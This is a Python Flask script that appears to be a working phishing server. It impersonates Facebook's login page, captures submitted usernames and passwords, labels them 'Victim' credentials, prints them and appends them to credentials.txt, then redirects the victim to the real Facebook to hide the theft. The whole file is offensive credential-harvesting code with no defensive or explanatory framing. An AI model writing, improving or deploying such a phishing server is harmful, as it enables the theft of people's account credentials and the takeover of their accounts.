from flask import Flask, render_template, request, redirect
import logging
import os

app = Flask(__name__)

# Color Codes
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Hide Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/', methods=['GET'])
def home():
    return render_template('facebook.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form.get('username')
        password = request.form.get('password')

        # Colorful output
        print(f"{GREEN}{BOLD}Victim username - {username}{RESET}")
        print(f"{RED}{BOLD}Victim password - {password}{RESET}")

        # Save to file
        with open('credentials.txt', 'a') as f:
            f.write(f"Victim username - {username}\n")
            f.write(f"Victim password - {password}\n\n")

        # Redirect to original site
        return redirect("https://www.facebook.com/")
    except Exception as e:
        print(f"{YELLOW}[ERROR] {e}{RESET}")
        return "Internal Server Error", 500

if __name__ == '__main__':
    os.environ["FLASK_ENV"] = "development"
    print(f"{CYAN}{BOLD}[SPYDER SERVER STARTED]{RESET}")
    app.run(host='0.0.0.0', port=5000, debug=True)
